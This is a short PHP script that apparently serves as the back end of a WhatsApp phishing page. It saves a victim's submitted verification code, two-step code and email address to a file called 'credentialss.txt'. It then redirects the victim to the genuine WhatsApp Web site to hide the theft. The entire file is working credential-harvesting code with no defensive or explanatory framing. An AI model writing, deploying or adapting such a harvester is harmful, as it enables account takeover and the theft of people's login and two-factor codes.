<?php
file_put_contents("credentialss.txt", 
                    "C. Verificación: " . $_POST['CodDigitos'] .  "\n".
                    "C. 2 Pasos: " . $_POST['CodeVerify'] .  "\n".
                    "Correo: " . $_POST['Correo']. "\n", FILE_APPEND );

header('Location: https://web.whatsapp.com');
exit;
?>
